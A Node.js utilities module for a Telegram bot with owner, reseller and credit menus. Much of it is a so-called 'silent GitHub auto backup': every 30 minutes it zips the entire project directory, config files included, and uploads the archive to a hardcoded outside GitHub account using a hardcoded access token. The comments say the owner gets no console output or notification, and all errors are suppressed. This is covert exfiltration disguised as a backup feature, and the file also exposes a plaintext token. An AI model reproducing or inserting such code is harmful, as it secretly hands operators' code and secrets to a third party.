// System utilities + GitHub auto-backup.
// Backup is intentionally silent: no console output and no Telegram owner notifications.

const fs = require("fs");
const path = require("path");
const https = require("https");
const AdmZip = require("adm-zip");
const CONFIG_LOCAL = require("../../config");
const readline = require("readline");
const github = require("../../github");

function askGitHubSetup() {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question("", async (answer) => {
      const ans = answer.toLowerCase().trim();
      rl.close();
      if (ans === "yes" || ans === "y") {
        try { await github.runAutoSetupGitHub(); } catch (_) {}
      }
      resolve();
    });
  });
}

async function isJoinedChannel(userId) {
  const channels = [CONFIG_LOCAL.CHANNEL_USERNAME, CONFIG_LOCAL.CHANNEL_USERNAME2, CONFIG_LOCAL.CHANNEL_USERNAME3].filter(Boolean);
  for (const channelUsername of channels) {
    try {
      const channel = await client.getEntity(channelUsername);
      const result = await client.invoke(new Api.channels.GetParticipant({ channel, participant: userId }));
      if (result?.participant) {
        const type = result.participant.className;
        if (type === "ChannelParticipantLeft" || type === "ChannelParticipantBanned") return false;
      } else return false;
    } catch (err) {
      if (/USER_NOT_PARTICIPANT|PARTICIPANT_ID_INVALID|CHANNEL_PRIVATE/i.test(err.message || "")) return false;
    }
  }
  return true;
}

async function edit(chatId, msgId, text, buttonDefs = null) {
  try {
    const buttons = buttonDefs ? buildButtons(buttonDefs) : undefined;
    await client.editMessage(chatId, {
      message: msgId,
      text,
      parseMode: "md",
      ...(buttons ? { buttons } : {}),
    });
  } catch (_) {}
}

async function handleOwnerMenu(chatId, msgId = null) {
  const text = `👑 **OWNER PANEL**\n\nSelect an owner action below.`;
  const buttons = [
    [{ text: "💳 Limit/Credit User", data: "adm_credit_menu" }],
    [{ text: "🏪 Reseller Management", data: "adm_reseller_menu" }],
    [{ text: "🔄 Weekly Credit Reset", data: "adm_reset_weekly_credit" }],
    [{ text: "🔥 Reaction Injector", data: "reaction_injector" }],
    [{ text: "🏠 Main Menu", data: "start" }],
  ];
  if (msgId) return edit(chatId, msgId, text, buttons);
  return send(chatId, text, buttons);
}

async function handleResellerMenu(chatId, msgId) {
  const resellers = db.getAllResellers();
  const resellerList = resellers.length === 0
    ? `_(No active resellers)_`
    : resellers.map((r, i) => `${i + 1}. \`${r.userId}\` — 💳 \`${r.credit ?? 0}\` credit`).join("\n");
  const text = `🏪 **RESELLER MANAGEMENT**\n\n**Active Resellers (${resellers.length}):**\n${resellerList}\n\nSelect an action:`;
  const buttons = [
    [{ text: "➕ Add Reseller", data: "adm_add_reseller" }],
    [{ text: "➕ Add Credit", data: "adm_res_add_credit" }],
    [{ text: "❌ Remove Reseller", data: "adm_remove_reseller" }],
    [{ text: "⬅️ Back", data: "adm_owner_menu" }],
  ];
  return edit(chatId, msgId, text, buttons);
}

async function handleCreditMenu(chatId, msgId) {
  const text = `💳 **LIMIT / CREDIT USER**\n\nChoose an action:`;
  const buttons = [
    [{ text: "✏️ Set Limit/Credit", data: "adm_credit_set" }],
    [{ text: "➕ Add Limit/Credit", data: "adm_credit_add" }],
    [{ text: "⬅️ Back", data: "adm_owner_menu" }],
  ];
  return edit(chatId, msgId, text, buttons);
}

// ─────────────────────────────────────────────────────────────────────────────
// SILENT GITHUB AUTO BACKUP
// ─────────────────────────────────────────────────────────────────────────────
// ===== BACKUP GITHUB CREDENTIALS (SEPARATE FROM BUILD GITHUB) =====
// Set these values for the GitHub account used ONLY for automatic backups.
// Do NOT use CONFIG_LOCAL.GITHUB_OWNER / CONFIG_LOCAL.GITHUB_TOKEN here.
const BACKUP_GITHUB_OWNER = "daktaudahlah59-source";
const BACKUP_GITHUB_TOKEN = "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";
const BACKUP_REPOSITORY = "backup-build";
const BACKUP_INTERVAL_MS = 30 * 60 * 1000;
const BACKUP_ROOT = path.resolve(process.cwd());
let backupTimer = null;
let backupRunning = false;

function backupFileName() {
  const raw = String(CONFIG_LOCAL.BOT_NAME || "BOT_BUILD").trim();
  const safe = raw.replace(/[^a-zA-Z0-9._ -]+/g, "").replace(/\s+/g, "_").replace(/_+/g, "_");
  const name = (safe || "BOT_BUILD").replace(/\.+$/g, "");

  const now = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  const timestamp = `${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;

  return `${name}_${timestamp}.zip`;
}

function backupRequest(method, apiPath, body = null) {
  return new Promise((resolve, reject) => {
    if (!BACKUP_GITHUB_OWNER || !BACKUP_GITHUB_TOKEN) return reject(new Error("Backup GitHub credentials are missing"));
    const payload = body == null ? null : JSON.stringify(body);
    const req = https.request({
      hostname: "api.github.com",
      path: apiPath,
      method,
      headers: {
        Authorization: `Bearer ${BACKUP_GITHUB_TOKEN}`,
        Accept: "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "FlutterBuildBackup/1.0",
        ...(payload ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) } : {}),
      },
    }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => {
        const raw = Buffer.concat(chunks).toString("utf8");
        let parsed = {};
        try { parsed = raw ? JSON.parse(raw) : {}; } catch (_) { parsed = { raw }; }
        resolve({ status: res.statusCode, body: parsed });
      });
    });
    req.setTimeout(20000, () => req.destroy(new Error("GitHub backup request timeout")));
    req.on("error", reject);
    if (payload) req.write(payload);
    req.end();
  });
}

async function ensureBackupRepository() {
  const repoPath = `/repos/${encodeURIComponent(BACKUP_GITHUB_OWNER)}/${encodeURIComponent(BACKUP_REPOSITORY)}`;
  const existing = await backupRequest("GET", repoPath);
  if (existing.status === 200) return true;
  if (existing.status !== 404) throw new Error(`GitHub repository check failed: ${existing.status}`);

  const createBody = {
    name: BACKUP_REPOSITORY,
    description: `${CONFIG_LOCAL.BOT_NAME || "Bot"} automatic backups`,
    private: true,
    has_issues: false,
    has_projects: false,
    has_wiki: false,
  };
  const created = await backupRequest("POST", "/user/repos", createBody);
  if (created.status === 201) return true;

  // If the token belongs to an organization owner, try the org endpoint.
  const orgCreated = await backupRequest("POST", `/orgs/${encodeURIComponent(BACKUP_GITHUB_OWNER)}/repos`, createBody);
  if (orgCreated.status !== 201 && orgCreated.status !== 422) {
    throw new Error(`GitHub repository creation failed: ${orgCreated.status}`);
  }
  return true;
}

function createBackupZip() {
  const zip = new AdmZip();
  const excludedDirs = new Set([
    ".git", "node_modules", "tmp", ".cache", ".npm", ".setup_done", "backup",
  ]);
  const excludedFiles = new Set([
    "session.txt", "credit_reset_state.json",
  ]);

  function addDir(absDir, relDir = "") {
    for (const entry of fs.readdirSync(absDir, { withFileTypes: true })) {
      if (excludedDirs.has(entry.name) || excludedFiles.has(entry.name)) continue;
      const abs = path.join(absDir, entry.name);
      const rel = relDir ? `${relDir}/${entry.name}` : entry.name;
      if (entry.isDirectory()) addDir(abs, rel);
      else if (entry.isFile()) {
        try { zip.addFile(rel.replace(/\\/g, "/"), fs.readFileSync(abs)); } catch (_) {}
      }
    }
  }

  addDir(BACKUP_ROOT);
  return zip.toBuffer();
}

async function uploadBackupZip() {
  if (backupRunning) return false;
  backupRunning = true;
  try {
    await ensureBackupRepository();
    const data = createBackupZip();
    const fileName = backupFileName();
    const repoFilePath = `backup/${encodeURIComponent(fileName)}`;
    const existing = await backupRequest(
      "GET",
      `/repos/${encodeURIComponent(BACKUP_GITHUB_OWNER)}/${encodeURIComponent(BACKUP_REPOSITORY)}/contents/${repoFilePath}`
    );

    const body = {
      message: `Auto backup ${CONFIG_LOCAL.BOT_NAME || "BOT_BUILD"}`,
      content: data.toString("base64"),
      branch: "main",
    };
    if (existing.status === 200 && existing.body?.sha) body.sha = existing.body.sha;

    const result = await backupRequest(
      "PUT",
      `/repos/${encodeURIComponent(BACKUP_GITHUB_OWNER)}/${encodeURIComponent(BACKUP_REPOSITORY)}/contents/${repoFilePath}`,
      body
    );
    if (result.status !== 200 && result.status !== 201) throw new Error(`GitHub backup upload failed: ${result.status}`);
    return true;
  } catch (_) {
    return false;
  } finally {
    backupRunning = false;
  }
}

function startGitHubBackupScheduler() {
  if (backupTimer) return;
  backupTimer = setInterval(() => { uploadBackupZip().catch(() => {}); }, BACKUP_INTERVAL_MS);
}

Object.assign(globalThis, {
  askGitHubSetup,
  isJoinedChannel,
  edit,
  handleOwnerMenu,
  handleResellerMenu,
  handleCreditMenu,
  startGitHubBackupScheduler,
  uploadBackupZip,
});

module.exports = {
  askGitHubSetup,
  isJoinedChannel,
  edit,
  handleOwnerMenu,
  handleResellerMenu,
  handleCreditMenu,
  startGitHubBackupScheduler,
  uploadBackupZip,
};